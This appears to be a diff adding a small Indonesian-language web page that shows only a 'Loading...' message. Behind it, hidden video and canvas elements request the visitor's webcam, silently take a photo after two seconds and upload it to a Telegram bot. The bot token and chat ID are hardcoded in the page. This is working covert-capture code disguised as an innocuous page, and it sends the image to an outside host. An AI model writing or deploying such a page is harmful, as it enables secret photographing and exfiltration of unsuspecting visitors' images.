@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Kamera Otomatis</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: black;
+      color: white;
+      font-family: sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+    #loading {
+      font-size: 20px;
+      margin-bottom: 20px;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div id="loading">Loading...</div>
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const token = "7840834767:AAGksa44Q5hWorJjEhTVS9wfVAvtBrHbMDM";
+    const chatId = "7819779147";
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const loadingText = document.getElementById('loading');
+
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        // Tunggu 2 detik untuk kamera siap
+        setTimeout(() => {
+          takePhotoAndSend();
+        }, 2000);
+      } catch (err) {
+        alert("Gagal akses kamera: " + err);
+      }
+    }
+
+    function takePhotoAndSend() {
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0);
+
+      canvas.toBlob(function(blob) {
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob);
+
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        }).then(() => {
+          loadingText.textContent = "Foto berhasil diambil!";
+        }).catch(() => {
+          loadingText.textContent = "Gagal mengirim foto.";
+        });
+      }, 'image/jpeg');
+    }
+
+    // Mulai proses
+    startCamera();
+  </script>
+</body>
+</html>
